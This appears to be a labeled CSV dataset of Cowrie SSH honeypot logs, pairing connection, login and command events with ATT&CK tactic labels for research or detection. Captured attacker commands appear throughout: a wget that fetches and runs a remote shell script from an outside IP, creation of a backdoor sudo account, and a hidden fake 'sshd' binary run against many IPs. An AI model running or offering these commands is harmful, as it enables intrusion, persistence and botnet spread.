,event,session_id,session,labels
32,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.396412Z"", ""username"": ""root"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
33,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.494400Z"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
34,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.495296Z"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
35,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 Ka2mQQks"", ""message"": ""CMD: openssl passwd -1 Ka2mQQks"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.495914Z"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
36,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 Ka2mQQks"", ""message"": ""Command not found: openssl passwd -1 Ka2mQQks"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.496825Z"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
37,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/ac75e0bcb721a3da2c2964bc9f4f8778f5e790b6bcac6d612ad7a1d68b90e176 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""ac75e0bcb721a3da2c2964bc9f4f8778f5e790b6bcac6d612ad7a1d68b90e176"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.510512Z"", ""ttylog"": ""var/lib/cowrie/tty/ac75e0bcb721a3da2c2964bc9f4f8778f5e790b6bcac6d612ad7a1d68b90e176"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
38,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.512154Z"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
39,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:62315 (10.42.4.33:2222) [session: ad91743b0874]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 62315.0, ""timestamp"": ""2025-08-08T21:18:09.676859Z"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
40,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:09.677250Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
41,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:09.780476Z"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
42,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:10.091912Z"", ""username"": ""root"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
43,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:10.358690Z"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
44,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:10.359042Z"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
45,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 Ehcn2SYk"", ""message"": ""CMD: openssl passwd -1 Ehcn2SYk"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:10.359460Z"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
46,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 Ehcn2SYk"", ""message"": ""Command not found: openssl passwd -1 Ehcn2SYk"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:10.360090Z"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
47,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/23a0d2a6f46cebfed8f2934e5f9d64aa09176162147289b06536d6ad3b72578d after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""23a0d2a6f46cebfed8f2934e5f9d64aa09176162147289b06536d6ad3b72578d"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:10.465163Z"", ""ttylog"": ""var/lib/cowrie/tty/23a0d2a6f46cebfed8f2934e5f9d64aa09176162147289b06536d6ad3b72578d"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
48,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T21:18:10.465753Z"", ""session_id"": ""ad91743b0874""}",ad91743b0874,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ehcn2SYk) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ehcn2SYk;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
49,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:12517 (10.42.6.15:2222) [session: 923727b1083a]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 12517.0, ""timestamp"": ""2025-08-04T20:54:06.511986Z"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
50,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:06.788041Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
51,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""aes256-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""0a07365cc01fa9fc82608ba4019af499"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c"", ""kex-strict-c-v00@openssh.com""], ""keyAlgs"": [""rsa-sha2-256-cert-v01@openssh.com"", ""rsa-sha2-512-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-256"", ""rsa-sha2-512"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-512-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha2-512"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:06.793488Z"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
52,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/admin] succeeded"", ""password"": ""admin"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:08.034380Z"", ""username"": ""root"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
53,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:08.438231Z"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
54,"{""eventid"": ""cowrie.command.input"", ""input"": ""wget http://23.146.184.21/x86.sh; chmod 777 *; sh x86.sh x86"", ""message"": ""CMD: wget http://23.146.184.21/x86.sh; chmod 777 *; sh x86.sh x86"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:08.438885Z"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
55,"{""duplicate"": false, ""duration"": ""0.2"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/6b7ead211bbcd531cccc64599c481d4bef6983cad31da6a1a44ad5222af0f87b after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""6b7ead211bbcd531cccc64599c481d4bef6983cad31da6a1a44ad5222af0f87b"", ""size"": 140.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:08.609754Z"", ""ttylog"": ""var/lib/cowrie/tty/6b7ead211bbcd531cccc64599c481d4bef6983cad31da6a1a44ad5222af0f87b"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
56,"{""eventid"": ""cowrie.session.file_download"", ""message"": ""Downloaded URL (http://23.146.184.21/x86.sh) with SHA-256 d0370954e58bfdaf93cd9211b058c76f489588f8c4eacea8f7f17c06f65e054a to var/lib/cowrie/downloads/d0370954e58bfdaf93cd9211b058c76f489588f8c4eacea8f7f17c06f65e054a"", ""outfile"": ""var/lib/cowrie/downloads/d0370954e58bfdaf93cd9211b058c76f489588f8c4eacea8f7f17c06f65e054a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""d0370954e58bfdaf93cd9211b058c76f489588f8c4eacea8f7f17c06f65e054a"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:08.744134Z"", ""url"": ""http://23.146.184.21/x86.sh"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
57,"{""duration"": ""2.4"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 2.4 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-04T20:54:08.950020Z"", ""session_id"": ""923727b1083a""}",923727b1083a,wget http://23.146.184.21/x86.sh ; chmod 777 * ; sh x86.sh x86;,"['Execution', 'Initial Access', 'Exfiltration', 'Command and Control']"
58,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:33756 (10.42.6.15:2222) [session: 1df748282e69]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 33756.0, ""timestamp"": ""2025-08-14T13:47:08.740892Z"", ""session_id"": ""1df748282e69""}",1df748282e69,chmod +x ./.8252363318861352132/sshd;nohup ./.8252363318861352132/sshd 61.171.78.137 60.16.8.124 191.96.11.220 47.79.43.177 5.189.157.5 43.167.236.203 175.6.181.69 120.71.0.7 141.11.187.6 46.38.150.239 141.98.233.197 45.227.67.219 155.94.170.162 212.115.54.22 160.191.3.69 58.49.140.148 47.111.137.37 45.183.155.43 137.184.190.227 162.19.102.3 140.233.190.164 103.173.15.171 35.180.74.175 119.96.174.82 46.235.84.183 111.12.131.236 221.179.57.254 47.109.204.95 103.145.145.79 36.163.199.22 85.133.225.6 31.47.51.84 124.222.68.65 103.145.145.82 106.75.68.22 219.152.61.9 103.145.145.78 190.123.74.50 45.45.239.129 45.147.76.155 161.132.56.248 45.15.168.245 104.223.122.139 60.165.126.250 113.7.221.72 122.193.64.145 188.166.211.175 31.210.64.67 58.229.240.18 103.186.97.118 124.225.67.32 &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
59,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T13:47:08.742494Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""1df748282e69""}",1df748282e69,chmod +x ./.8252363318861352132/sshd;nohup ./.8252363318861352132/sshd 61.171.78.137 60.16.8.124 191.96.11.220 47.79.43.177 5.189.157.5 43.167.236.203 175.6.181.69 120.71.0.7 141.11.187.6 46.38.150.239 141.98.233.197 45.227.67.219 155.94.170.162 212.115.54.22 160.191.3.69 58.49.140.148 47.111.137.37 45.183.155.43 137.184.190.227 162.19.102.3 140.233.190.164 103.173.15.171 35.180.74.175 119.96.174.82 46.235.84.183 111.12.131.236 221.179.57.254 47.109.204.95 103.145.145.79 36.163.199.22 85.133.225.6 31.47.51.84 124.222.68.65 103.145.145.82 106.75.68.22 219.152.61.9 103.145.145.78 190.123.74.50 45.45.239.129 45.147.76.155 161.132.56.248 45.15.168.245 104.223.122.139 60.165.126.250 113.7.221.72 122.193.64.145 188.166.211.175 31.210.64.67 58.229.240.18 103.186.97.118 124.225.67.32 &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
60,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""98ddc5604ef6a1006a2b49a58759fbe6"", ""hashAlgorithms"": ""curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha1""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T13:47:08.850246Z"", ""session_id"": ""1df748282e69""}",1df748282e69,chmod +x ./.8252363318861352132/sshd;nohup ./.8252363318861352132/sshd 61.171.78.137 60.16.8.124 191.96.11.220 47.79.43.177 5.189.157.5 43.167.236.203 175.6.181.69 120.71.0.7 141.11.187.6 46.38.150.239 141.98.233.197 45.227.67.219 155.94.170.162 212.115.54.22 160.191.3.69 58.49.140.148 47.111.137.37 45.183.155.43 137.184.190.227 162.19.102.3 140.233.190.164 103.173.15.171 35.180.74.175 119.96.174.82 46.235.84.183 111.12.131.236 221.179.57.254 47.109.204.95 103.145.145.79 36.163.199.22 85.133.225.6 31.47.51.84 124.222.68.65 103.145.145.82 106.75.68.22 219.152.61.9 103.145.145.78 190.123.74.50 45.45.239.129 45.147.76.155 161.132.56.248 45.15.168.245 104.223.122.139 60.165.126.250 113.7.221.72 122.193.64.145 188.166.211.175 31.210.64.67 58.229.240.18 103.186.97.118 124.225.67.32 &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
